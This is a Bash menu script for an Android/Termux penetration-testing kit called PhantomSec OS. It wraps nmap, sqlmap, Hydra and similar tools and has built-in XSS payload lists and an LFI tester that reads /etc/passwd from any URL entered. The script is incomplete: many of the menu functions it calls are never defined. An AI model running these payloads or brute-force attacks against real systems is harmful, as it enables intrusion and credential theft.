#!/data/data/com.termux/files/usr/bin/bash
# ╔══════════════════════════════════════════════════════════════════════╗
# ║          PhantomSec OS — Main Menu Interface v1.3.1                 ║
# ╚══════════════════════════════════════════════════════════════════════╝

# อ่าน version จากไฟล์ VERSION แยก (เปลี่ยนได้โดย update.sh ไม่ต้องแก้ script)
_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
_VERSION_FILE="$_SCRIPT_DIR/VERSION"
# ถ้ารันจาก $PREFIX/bin ให้หา VERSION ใน PHANTOMSEC_DIR แทน
if [ ! -f "$_VERSION_FILE" ]; then
  _VERSION_FILE="${PHANTOMSEC_DIR:-$HOME/.phantomsec}/VERSION"
fi
VERSION="$(cat "$_VERSION_FILE" 2>/dev/null | tr -d '[:space:]' || echo '1.3.1')"
PHANTOMSEC_DIR="${PHANTOMSEC_DIR:-$HOME/.phantomsec}"
LOG_FILE="$PHANTOMSEC_DIR/logs/session_$(date +%Y%m%d_%H%M%S).log"

# ── Colours ────────────────────────────────────────────────────────────
R='\033[0;31m'   DR='\033[0;91m'
G='\033[0;32m'   DG='\033[0;92m'
Y='\033[1;33m'
C='\033[0;36m'   DC='\033[0;96m'
M='\033[0;35m'   DM='\033[0;95m'
B='\033[0;34m'
W='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
BLINK='\033[5m'
UL='\033[4m'
NC='\033[0m'

# ── Box chars ──────────────────────────────────────────────────────────
TL='╔' TR='╗' BL='╚' BR='╝'
H='═'  V='║'  LM='╠' RM='╣'
TM='╦' BM='╩'

mkdir -p "$PHANTOMSEC_DIR"/{logs,sessions,wordlists,reports,config}

# ── Helpers ────────────────────────────────────────────────────────────
log() { echo "[$(date '+%T')] $*" >> "$LOG_FILE"; }
press_enter() { echo -e "\n${DIM}  Press ${C}[ENTER]${DIM} to continue...${NC}"; read -r; }
pause() { sleep "${1:-1}"; }

draw_line() {
  local char="${1:-═}" len="${2:-68}"
  printf "${M}"; printf '%0.s'"$char" $(seq 1 $len); printf "${NC}\n"
}

draw_box() {
  local title="$1" width="${2:-66}"
  local inner=$((width - 2))
  printf "${M}${TL}"; printf '%0.s'"${H}" $(seq 1 $inner); printf "${TR}${NC}\n"
  if [ -n "$title" ]; then
    local tlen=${#title}
    local pad=$(( (inner - tlen) / 2 ))
    printf "${M}${V}${NC}"
    printf '%0.s ' $(seq 1 $pad)
    printf "${DC}${BOLD}%s${NC}" "$title"
    printf '%0.s ' $(seq 1 $(( inner - pad - tlen )) )
    printf "${M}${V}${NC}\n"
    printf "${M}${LM}"; printf '%0.s'"${H}" $(seq 1 $inner); printf "${RM}${NC}\n"
  fi
}

draw_box_bottom() {
  local width="${1:-66}"
  local inner=$((width - 2))
  printf "${M}${BL}"; printf '%0.s'"${H}" $(seq 1 $inner); printf "${BR}${NC}\n"
}

# ── Banner ─────────────────────────────────────────────────────────────
show_banner() {
  clear
  echo ""
  echo -e "${M}${BOLD}"
  cat << 'BANNER'
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
BANNER
  echo -e "${DC}${BOLD}"
  cat << 'BANNER2'
                ███████╗███████╗ ██████╗
                ██╔════╝██╔════╝██╔════╝
                ███████╗█████╗  ██║
                ╚════██║██╔══╝  ██║
                ███████║███████╗╚██████╗
                ╚══════╝╚══════╝ ╚═════╝
BANNER2
  echo -e "${NC}"
  echo -e "${DIM}  ┌─────────────────────────────────────────────────────────┐${NC}"
  echo -e "${DIM}  │  ${DC}Termux Cybersecurity Distro${DIM}  │  ${G}v${VERSION}${DIM}  │  ${Y}Use Ethically${DIM}  │${NC}"
  echo -e "${DIM}  └─────────────────────────────────────────────────────────┘${NC}"
  echo ""
  # System info bar
  local ip user_name platform
  ip=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || echo "offline")
  user_name=$(whoami)
  platform="Android/Termux"
  echo -e "  ${DIM}${C}󰞥${NC} ${DIM}User:${NC} ${W}$user_name${NC}   ${DIM}${C}󰱓${NC} ${DIM}IP:${NC} ${W}$ip${NC}   ${DIM}${C}󰌽${NC} ${DIM}Platform:${NC} ${W}$platform${NC}"
  echo ""
}

# ── Status indicator ───────────────────────────────────────────────────
tool_status() {
  if command -v "$1" &>/dev/null; then
    echo -e "${G}[INSTALLED]${NC}"
  else
    echo -e "${R}[MISSING]  ${NC}"
  fi
}

# ══════════════════════════════════════════════════════════════════════
#  M E N U S
# ══════════════════════════════════════════════════════════════════════

# ── Main Menu ──────────────────────────────────────────────────────────
main_menu() {
  while true; do
    show_banner
    draw_box "  MAIN MENU" 66
    echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[01]${NC}  ${W}🔍 Information Gathering${NC}               ${DIM}Recon & OSINT${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[02]${NC}  ${W}🔓 Vulnerability Scanning${NC}              ${DIM}Exploit finding${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[03]${NC}  ${W}💉 Web Exploitation${NC}                    ${DIM}SQLi, XSS, LFI${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[04]${NC}  ${W}🔑 Password Attacks${NC}                    ${DIM}Brute force & cracking${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[05]${NC}  ${W}📡 Network Analysis${NC}                    ${DIM}Sniffing & MITM${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[06]${NC}  ${W}📱 Wireless Attacks${NC}                    ${DIM}WiFi & Bluetooth${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[07]${NC}  ${W}🐚 Reverse Shells${NC}                      ${DIM}Payloads & listeners${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[08]${NC}  ${W}🛡️  Forensics & Analysis${NC}                ${DIM}Evidence & memory${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[09]${NC}  ${W}🔐 Cryptography Tools${NC}                  ${DIM}Encode, decode, hash${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[10]${NC}  ${W}📦 Tool Manager${NC}                        ${DIM}Install & update${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[11]${NC}  ${W}📊 Session Manager${NC}                     ${DIM}Logs & reports${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[12]${NC}  ${W}⚙️  Settings${NC}                            ${DIM}Config & themes${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[13]${NC}  ${W}🎣 Social Engineering${NC}                  ${DIM}Phishing & SE tools${NC}"
    echo -e "${M}${V}${NC}  ${DC}${BOLD}[14]${NC}  ${W}🍯 Honeypot${NC}                            ${DIM}Trap & log attackers${NC}"
    echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${R}${BOLD}[00]${NC}  ${DIM}Exit PhantomSec${NC}"
    echo -e "${M}${V}${NC}"
    draw_box_bottom 66

    echo ""
    echo -ne "  ${M}▶${NC} ${W}Select option:${NC} ${C}"
    read -r choice
    echo -ne "${NC}"
    log "Main menu → $choice"

    case "$choice" in
      1|01) menu_recon ;;
      2|02) menu_vuln_scan ;;
      3|03) menu_web_exploit ;;
      4|04) menu_password ;;
      5|05) menu_network ;;
      6|06) menu_wireless ;;
      7|07) menu_shells ;;
      8|08) menu_forensics ;;
      9|09) menu_crypto ;;
      10) menu_tool_manager ;;
      11) menu_sessions ;;
      12) menu_settings ;;
      13) menu_social ;;
      14) menu_honeypot ;;
      0|00) exit_phantom ;;
      *) echo -e "  ${R}Invalid option. Try again.${NC}"; sleep 1 ;;
    esac
  done
}

# ── 01  Information Gathering ──────────────────────────────────────────
menu_recon() {
  while true; do
    show_banner
    draw_box "  🔍 INFORMATION GATHERING" 66
    echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}Nmap Port Scanner${NC}          $(tool_status nmap)"
    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}Whois Lookup${NC}               $(tool_status whois)"
    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}DNS Enumeration${NC}            ${DIM}(dig / nslookup)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[4]${NC}  ${W}Subdomain Finder${NC}           ${DIM}(curl + wordlist)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[5]${NC}  ${W}GeoIP Lookup${NC}               ${DIM}(ip-api.com)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[6]${NC}  ${W}HTTP Header Inspector${NC}      ${DIM}(curl)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[7]${NC}  ${W}Shodan Search${NC}              ${DIM}(API key required)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[8]${NC}  ${W}Banner Grabbing${NC}            ${DIM}(nc / curl)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[9]${NC}  ${W}WhatWeb Fingerprint${NC}        $(tool_status whatweb)"
    echo -e "${M}${V}${NC}  ${DC}[10]${NC} ${W}theHarvester OSINT${NC}         $(tool_status theHarvester)"
    echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back to Main Menu"
    echo -e "${M}${V}${NC}"
    draw_box_bottom 66
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"

    case "$r" in
      1) run_nmap ;;
      2) run_whois ;;
      3) run_dns ;;
      4) run_subdomain ;;
      5) run_geoip ;;
      6) run_headers ;;
      7) run_shodan ;;
      8) run_banner ;;
      9) run_whatweb ;;
      10) run_harvester ;;
      0) return ;;
    esac
  done
}

run_nmap() {
  show_banner
  draw_box "  NMAP SCANNER" 66
  echo ""
  echo -ne "  ${C}Target (IP or domain):${NC} "; read -r target
  echo ""
  echo -e "  ${W}Scan type:${NC}"
  echo -e "  ${DC}[1]${NC} Quick (top 100 ports)"
  echo -e "  ${DC}[2]${NC} Full (all 65535 ports)"
  echo -e "  ${DC}[3]${NC} Service & Version detection"
  echo -e "  ${DC}[4]${NC} OS detection"
  echo -e "  ${DC}[5]${NC} Custom flags"
  echo ""
  echo -ne "  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r st; echo -ne "${NC}"

  local flags=()
  case "$st" in
    1) flags=(-F) ;;
    2) flags=(-p-) ;;
    3) flags=(-sV -sC) ;;
    4) flags=(-O) ;;
    5) echo -ne "  ${C}Enter nmap flags:${NC} "; read -r xflags; read -ra flags <<< "$xflags" ;;
    *) flags=(-F) ;;
  esac

  echo ""
  draw_line "─" 66
  echo -e "${G}[+] Running: nmap ${flags[*]} $target${NC}"
  draw_line "─" 66
  nmap "${flags[@]}" "$target" 2>&1 | tee "$PHANTOMSEC_DIR/reports/nmap_$(date +%s).txt"
  draw_line "─" 66
  echo -e "${G}[✓] Report saved to $PHANTOMSEC_DIR/reports/${NC}"
  log "Nmap scan: $flags $target"
  press_enter
}

run_whois() {
  show_banner; draw_box "  WHOIS LOOKUP" 66; echo ""
  echo -ne "  ${C}Domain or IP:${NC} "; read -r t
  echo ""; draw_line "─" 66
  whois "$t" 2>&1 | head -60
  draw_line "─" 66; press_enter
}

run_dns() {
  show_banner; draw_box "  DNS ENUMERATION" 66; echo ""
  echo -ne "  ${C}Domain:${NC} "; read -r d
  echo ""
  echo -e "${G}[+] A Records:${NC}"; dig +short A "$d"
  echo -e "${G}[+] MX Records:${NC}"; dig +short MX "$d"
  echo -e "${G}[+] NS Records:${NC}"; dig +short NS "$d"
  echo -e "${G}[+] TXT Records:${NC}"; dig +short TXT "$d"
  echo -e "${G}[+] CNAME:${NC}"; dig +short CNAME "$d"
  press_enter
}

run_subdomain() {
  show_banner; draw_box "  SUBDOMAIN FINDER" 66; echo ""
  echo -ne "  ${C}Base domain (e.g. example.com):${NC} "; read -r domain
  local subs=("www" "mail" "ftp" "admin" "vpn" "api" "dev" "staging" "blog" "shop" "portal" "cdn" "static" "app" "mobile")
  echo ""
  draw_line "─" 66
  echo -e "${G}[+] Scanning subdomains for $domain ...${NC}"
  echo ""
  for sub in "${subs[@]}"; do
    local full="$sub.$domain"
    if host "$full" &>/dev/null 2>&1; then
      echo -e "  ${G}[FOUND]${NC}  $full  →  $(dig +short A "$full" | head -1)"
    fi
  done
  draw_line "─" 66; press_enter
}

run_geoip() {
  show_banner; draw_box "  GEOIP LOOKUP" 66; echo ""
  echo -ne "  ${C}IP Address:${NC} "; read -r ip
  echo ""; draw_line "─" 66
  curl -s "http://ip-api.com/json/$ip" | python3 -m json.tool 2>/dev/null || curl -s "http://ip-api.com/json/$ip"
  draw_line "─" 66; press_enter
}

run_headers() {
  show_banner; draw_box "  HTTP HEADER INSPECTOR" 66; echo ""
  echo -ne "  ${C}URL (with https://):${NC} "; read -r url
  echo ""; draw_line "─" 66
  curl -sI "$url"
  draw_line "─" 66; press_enter
}

run_shodan() {
  show_banner; draw_box "  SHODAN SEARCH" 66; echo ""
  echo -e "  ${Y}[!] Requires a Shodan API key.${NC}"
  echo -ne "  ${C}API Key:${NC} "; read -rs key; echo ""
  echo -ne "  ${C}Search query:${NC} "; read -r query
  echo ""; draw_line "─" 66
  local enc_q; enc_q=$(printf '%s' "$query" | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().rstrip()))')
  curl -s --max-time 10 "https://api.shodan.io/shodan/host/search?key=$key&query=$enc_q" | python3 -m json.tool 2>/dev/null | head -80
  draw_line "─" 66; press_enter
}

run_banner() {
  show_banner; draw_box "  BANNER GRABBING" 66; echo ""
  echo -ne "  ${C}Host:${NC} "; read -r h
  echo -ne "  ${C}Port:${NC} "; read -r p
  echo ""; draw_line "─" 66
  timeout 5 bash -c "echo '' | nc -w 3 $(printf '%q' "$h") $(printf '%q' "$p")" 2>&1
  draw_line "─" 66; press_enter
}

# ── 02  Vulnerability Scanning ─────────────────────────────────────────
menu_vuln_scan() {
  while true; do
    show_banner; draw_box "  🔓 VULNERABILITY SCANNING" 66; echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}Nikto Web Scanner${NC}          $(tool_status nikto)"
    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}OpenVAS (via REST)${NC}         ${DIM}(external)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}CVE Lookup${NC}                 ${DIM}(nvd.nist.gov)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[4]${NC}  ${W}SSL/TLS Checker${NC}            ${DIM}(ssllabs)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[5]${NC}  ${W}Custom Nmap Vuln Script${NC}    ${DIM}(--script vuln)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[6]${NC}  ${W}Nuclei Scanner${NC}             $(tool_status nuclei)"
    echo -e "${M}${V}${NC}"; echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back"; echo -e "${M}${V}${NC}"
    draw_box_bottom 66
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
    case "$r" in
      1) echo -ne "  ${C}Target URL:${NC} "; read -r t; echo ""; nikto -h "$t" 2>&1 | tee "$PHANTOMSEC_DIR/reports/nikto_$(date +%s).txt"; press_enter ;;
      2) echo -e "  ${Y}[!] OpenVAS requires a running OpenVAS server. Use Nuclei (option 6) for Termux.${NC}"; press_enter ;;
      3) echo -ne "  ${C}CVE ID (e.g. CVE-2021-44228):${NC} "; read -r cve
         curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=$cve" | python3 -m json.tool 2>/dev/null | head -50; press_enter ;;
      4) echo -ne "  ${C}Domain:${NC} "; read -r d
         curl -s "https://api.ssllabs.com/api/v3/analyze?host=$d&startNew=on" | python3 -m json.tool 2>/dev/null | head -40; press_enter ;;
      5) echo -ne "  ${C}Target:${NC} "; read -r t; nmap --script vuln "$t" 2>&1 | tee "$PHANTOMSEC_DIR/reports/vulnscan_$(date +%s).txt"; press_enter ;;
      6) run_nuclei ;;
      0) return ;;
    esac
  done
}

# ── 03  Web Exploitation ───────────────────────────────────────────────
menu_web_exploit() {
  while true; do
    show_banner; draw_box "  💉 WEB EXPLOITATION" 66; echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}SQLMap — SQL Injection${NC}     $(tool_status sqlmap)"
    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}XSS Payload Generator${NC}      ${DIM}(built-in)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}Directory Bruteforce${NC}       ${DIM}(curl)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[4]${NC}  ${W}LFI Tester${NC}                 ${DIM}(built-in)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[5]${NC}  ${W}CORS & Security Headers${NC}    ${DIM}(built-in)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[6]${NC}  ${W}Gobuster Dir Scan${NC}          $(tool_status gobuster)"
    echo -e "${M}${V}${NC}"; echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back"; echo -e "${M}${V}${NC}"
    draw_box_bottom 66
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
    case "$r" in
      1) run_sqlmap ;;
      2) run_xss_gen ;;
      3) run_dirbust ;;
      4) run_lfi ;;
      5) run_cors ;;
      6) run_gobuster ;;
      0) return ;;
    esac
  done
}

run_sqlmap() {
  show_banner; draw_box "  SQLMAP" 66; echo ""
  echo -ne "  ${C}Target URL (with param, e.g. http://site.com/page?id=1):${NC} "; read -r url
  echo -e "\n  ${W}Options:${NC}"
  echo -e "  ${DC}[1]${NC} Basic scan     ${DC}[2]${NC} Dump databases     ${DC}[3]${NC} Custom flags"
  echo -ne "\n  ${M}▶${NC} "; read -r o
  local flags=(--batch --level=3 --risk=2)
  case "$o" in
    2) flags+=(--dbs) ;;
    3) echo -ne "  ${C}Extra flags:${NC} "; read -r xf; read -ra xfarr <<< "$xf"; flags+=("${xfarr[@]}") ;;
  esac
  echo ""; draw_line "─" 66
  sqlmap -u "$url" "${flags[@]}" 2>&1 | tee "$PHANTOMSEC_DIR/reports/sqlmap_$(date +%s).txt"
  draw_line "─" 66; press_enter
}

run_xss_gen() {
  show_banner; draw_box "  XSS PAYLOAD GENERATOR" 66; echo ""
  echo -e "  ${W}Common XSS Payloads:${NC}"; echo ""
  local payloads=(
    '<script>alert(1)</script>'
    '<img src=x onerror=alert(1)>'
    '"><script>alert(document.domain)</script>'
    "';alert(1)//"
    '<svg onload=alert(1)>'
    'javascript:alert(1)'
    '<body onload=alert(1)>'
    '{{7*7}}'
    '${7*7}'
  )
  local i=1
  for p in "${payloads[@]}"; do
    echo -e "  ${DC}[$i]${NC}  ${G}$p${NC}"
    ((i++))
  done
  echo ""
  echo -ne "  ${C}Test URL (blank to skip):${NC} "; read -r url
  if [ -n "$url" ]; then
    for p in "${payloads[@]}"; do
      enc=$(printf '%s' "$p" | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().rstrip()))')
      echo -ne "  Testing: ${DIM}$p${NC} ... "
      code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${url}${enc}")
      echo -e "${G}HTTP $code${NC}"
    done
  fi
  press_enter
}

run_dirbust() {
  show_banner; draw_box "  DIRECTORY BRUTEFORCE" 66; echo ""
  echo -ne "  ${C}Target URL (e.g. http://site.com):${NC} "; read -r base
  local dirs=("admin" "login" "dashboard" "wp-admin" "phpmyadmin" "backup" "config" "api" "uploads" "images" ".git" ".env" "robots.txt" "sitemap.xml" "console" "panel" "secret" "test" "dev" "old")
  echo ""; draw_line "─" 66; echo ""
  for d in "${dirs[@]}"; do
    local code; code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$base/$d" 2>/dev/null)
    case "$code" in
      200) echo -e "  ${G}[200 FOUND ]${NC}  $base/$d" ;;
      301|302) echo -e "  ${Y}[${code} REDIR]${NC}  $base/$d" ;;
      403) echo -e "  ${DC}[403 FORBID]${NC}  $base/$d" ;;
    esac
  done
  draw_line "─" 66; press_enter
}

run_lfi() {
  show_banner; draw_box "  LFI TESTER" 66; echo ""
  echo -ne "  ${C}Vulnerable URL (e.g. http://site.com/page?file=):${NC} "; read -r url
  local payloads=("../etc/passwd" "../../etc/passwd" "../../../etc/passwd" "../../../../etc/passwd" "/etc/passwd" "....//....//etc/passwd")
  echo ""; draw_line "─" 66
  for p in "${payloads[@]}"; do
    result=$(curl -s --max-time 5 "${url}${p}" 2>/dev/null | grep -c "root:" || true)
    if [ "$result" -gt 0 ]; then
      echo -e "  ${G}[VULNERABLE]${NC}  Payload: ${G}$p${NC}"
      curl -s --max-time 5 "${url}${p}" | head -5
    fi
  done
  draw_line "─" 66; press_enter
}

run_cors() {
  show_banner; draw_box "  CORS & SECURITY HEADERS" 66; echo ""
  echo -ne "  ${C}Target URL:${NC} "; read -r url
  echo ""; draw_line "─" 66
  local headers; headers=$(curl -sI --max-time 8 "$url" 2>/dev/null)
  local checks=("X-Frame-Options" "X-XSS-Protection" "Content-Security-Policy" "Strict-Transport-Security" "X-Content-Type-Options" "Access-Control-Allow-Origin")
  for h in "${checks[@]}"; do
    if echo "$headers" | grep -qi "$h"; then
      echo -e "  ${G}[✓] $h${NC}  — present"
    else
      echo -e "  ${R}[✗] $h${NC}  — MISSING"
    fi
  done
  draw_line "─" 66; press_enter
}

# ── 04  Password Attacks ───────────────────────────────────────────────
menu_password() {
  while true; do
    show_banner; draw_box "  🔑 PASSWORD ATTACKS" 66; echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}Hydra — Network Bruteforce${NC} $(tool_status hydra)"
    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}Hash Identifier${NC}            ${DIM}(built-in)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}Hash Cracker (online)${NC}      ${DIM}(hashes.com)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[4]${NC}  ${W}Password Generator${NC}         ${DIM}(built-in)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[5]${NC}  ${W}Wordlist Manager${NC}           ${DIM}(built-in)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[6]${NC}  ${W}John the Ripper${NC}            $(tool_status john)"
    echo -e "${M}${V}${NC}"; echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back"; echo -e "${M}${V}${NC}"
    draw_box_bottom 66
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
    case "$r" in
      1) run_hydra ;;
      2) run_hash_id ;;
      3) run_hash_crack ;;
      4) run_passgen ;;
      5) run_wordlist_mgr ;;
      6) run_john ;;
      0) return ;;
    esac
  done
}

run_hydra() {
  show_banner; draw_box "  HYDRA BRUTEFORCE" 66; echo ""
  echo -ne "  ${C}Target (IP/hostname):${NC} "; read -r target
  echo -e "\n  ${W}Service:${NC}"
  local services=("ssh" "ftp" "http-post-form" "mysql" "rdp" "smtp" "telnet" "vnc")
  for i in "${!services[@]}"; do echo -e "  ${DC}[$((i+1))]${NC} ${services[$i]}"; done
  echo -ne "\n  ${M}▶${NC} "; read -r si
  local svc="${services[$((si-1))]:-ssh}"
  echo -ne "  ${C}Username:${NC} "; read -r user
  echo -ne "  ${C}Wordlist path [default common-passwords]:${NC} "; read -r wl
  wl="${wl:-$PHANTOMSEC_DIR/wordlists/common-passwords.txt}"
  echo ""; draw_line "─" 66
  hydra -l "$user" -P "$wl" "$target" "$svc" -t 4 2>&1 | tee "$PHANTOMSEC_DIR/reports/hydra_$(date +%s).txt"
  draw_line "─" 66; press_enter
}

run_hash_id() {
  show_banner; draw_box "  HASH IDENTIFIER" 66; echo ""
  echo -ne "  ${C}Hash:${NC} "; read -r hash
  local len=${#hash}
  echo ""
  case "$len" in
    32) echo -e "  ${G}[+] Likely: MD5${NC}" ;;
    40) echo -e "  ${G}[+] Likely: SHA-1${NC}" ;;
    56) echo -e "  ${G}[+] Likely: SHA-224${NC}" ;;
    64) echo -e "  ${G}[+] Likely: SHA-256${NC}" ;;
    96) echo -e "  ${G}[+] Likely: SHA-384${NC}" ;;
    128) echo -e "  ${G}[+] Likely: SHA-512${NC}" ;;
    *) echo -e "  ${Y}[?] Unknown hash type (len=$len)${NC}" ;;
  esac
  if [[ "$hash" =~ ^\$2[aby]\$ ]]; then echo -e "  ${G}[+] Also matches: BCrypt${NC}"; fi
  if [[ "$hash" =~ ^\$1\$ ]]; then echo -e "  ${G}[+] Also matches: MD5-Crypt${NC}"; fi
  press_enter
}

run_hash_crack() {
  show_banner; draw_box "  HASH CRACKER (Online)" 66; echo ""
  echo -ne "  ${C}Hash to crack:${NC} "; read -r hash
  echo ""; draw_line "─" 66
  result=$(curl -s "https://hashes.com/en/decrypt/hash?hashes=${hash}" 2>/dev/null | grep -oP 'class="result"[^>]*>\K[^<]+' | head -1 || echo "No result found")
  echo -e "  ${G}Result: $result${NC}"
  # Fallback: try md5decrypt
  result2=$(curl -s "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=check@email.com&code=code1" 2>/dev/null)
  [ -n "$result2" ] && echo -e "  ${G}MD5Decrypt: $result2${NC}"
  draw_line "─" 66; press_enter
}

run_passgen() {
  show_banner; draw_box "  PASSWORD GENERATOR" 66; echo ""
  echo -ne "  ${C}Length [default 16]:${NC} "; read -r len; len="${len:-16}"
  echo -ne "  ${C}Count [default 10]:${NC} "; read -r cnt; cnt="${cnt:-10}"
  echo ""; draw_line "─" 66
  for i in $(seq 1 "$cnt"); do
    tr -dc 'A-Za-z0-9!@#$%^&*()_+\-=' < /dev/urandom | head -c "$len"; echo
  done
  draw_line "─" 66; press_enter
}

run_wordlist_mgr() {
  show_banner; draw_box "  WORDLIST MANAGER" 66; echo ""
  echo -e "  ${W}Available wordlists:${NC}"; echo ""
  ls -lh "$PHANTOMSEC_DIR/wordlists/" 2>/dev/null || echo "  (none)"
  echo ""
  echo -e "  ${DC}[1]${NC} Download rockyou (top 1000)  ${DC}[2]${NC} Download SecLists common"
  echo -e "  ${DC}[3]${NC} Custom download               ${DC}[0]${NC} Back"
  echo -ne "\n  ${M}▶${NC} "; read -r o
  case "$o" in
    1) curl -L "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" -o "$PHANTOMSEC_DIR/wordlists/rockyou-top1000.txt" && echo -e "  ${G}[✓] Downloaded${NC}" ;;
    2) curl -L "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt" -o "$PHANTOMSEC_DIR/wordlists/ssh-common.txt" && echo -e "  ${G}[✓] Downloaded${NC}" ;;
    3) echo -ne "  ${C}URL:${NC} "; read -r url; echo -ne "  ${C}Filename:${NC} "; read -r fn; curl -L "$url" -o "$PHANTOMSEC_DIR/wordlists/$fn" ;;
  esac
  press_enter
}

# ── 05  Network Analysis ───────────────────────────────────────────────
menu_network() {
  while true; do
    show_banner; draw_box "  📡 NETWORK ANALYSIS" 66; echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}Network Interfaces${NC}         ${DIM}(ip addr)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}ARP Scan${NC}                   ${DIM}(nmap -sn)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}Traceroute${NC}                 ${DIM}(traceroute)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[4]${NC}  ${W}Ping Sweep${NC}                 ${DIM}(nmap -sP)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[5]${NC}  ${W}Open Ports (localhost)${NC}     ${DIM}(ss -tuln)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[6]${NC}  ${W}Packet Inspector${NC}           ${DIM}(tcpdump)${NC}"
    echo -e "${M}${V}${NC}  ${DC}[7]${NC}  ${W}Masscan Fast Scan${NC}          $(tool_status masscan)"
    echo -e "${M}${V}${NC}"; echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back"; echo -e "${M}${V}${NC}"
    draw_box_bottom 66
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
    case "$r" in
      1) ip addr 2>/dev/null || ifconfig; press_enter ;;
      2) echo -ne "  ${C}Subnet (e.g. 192.168.1.0/24):${NC} "; read -r s; nmap -sn "$s" 2>&1; press_enter ;;
      3) echo -ne "  ${C}Target:${NC} "; read -r t; traceroute "$t" 2>&1; press_enter ;;
      4) echo -ne "  ${C}Subnet:${NC} "; read -r s; nmap -sP "$s" 2>&1; press_enter ;;
      5) ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null; press_enter ;;
      6) echo -ne "  ${C}Interface [wlan0]:${NC} "; read -r i; i="${i:-wlan0}"; tcpdump -i "$i" -c 20 2>&1; press_enter ;;
      7) run_masscan ;;
      0) return ;;
    esac
  done
}

